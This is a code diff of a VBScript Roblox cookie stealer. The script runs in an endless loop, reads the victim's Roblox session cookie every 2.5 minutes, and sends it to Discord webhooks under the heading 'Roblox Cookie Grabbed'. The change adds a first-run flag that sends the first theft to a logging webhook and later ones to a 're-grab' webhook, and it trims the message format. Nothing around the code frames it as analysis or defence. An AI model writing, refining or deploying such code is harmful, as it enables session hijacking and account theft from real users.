@@ -1,4 +1,4 @@
-Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie
+Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie, isFirstRun
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -8,6 +8,7 @@ WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0X
 
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+isFirstRun = True
 
 On Error Resume Next
 Dim selfPath: selfPath = WScript.ScriptFullName
@@ -28,7 +29,8 @@ On Error Goto 0
 lastCookie = ""
 Do
     Call GrabRoblox
-    WScript.Sleep 150000
+    isFirstRun = False
+    WScript.Sleep 150000 ' 2.5 minutes
 Loop
 
 Sub GrabRoblox()
@@ -43,11 +45,20 @@ Sub GrabRoblox()
     
     If cookie <> lastCookie Then
         lastCookie = cookie
-        Dim t: t = FormatDateTime(Now, 3)
+        Dim t: t = FormatDateTime(Now, 3) ' 3 = hh:mm:ss AM/PM local time
         
-        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""Client: " & PC & " / " & USER & "\n\n``````" & cookie & "``````"",""color"":65280,""footer"":{""text"":""Grabbed at " & t & """}}]}"
+        ' Determine webhook based on first run
+        Dim destWH
+        If isFirstRun Then
+            destWH = WH_LOGS
+        Else
+            destWH = WH_REGRAB
+        End If
         
-        SendWebhook WH_REGRAB, embed
+        ' Flush codeblock formatting so there are no empty dots at the top
+        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""``````" & cookie & "``````"",""color"":65280,""footer"":{""text"":""Roblox Tracker • Grabbed at " & t & """}}]}"
+        
+        SendWebhook destWH, embed
     End If
 End Sub
 
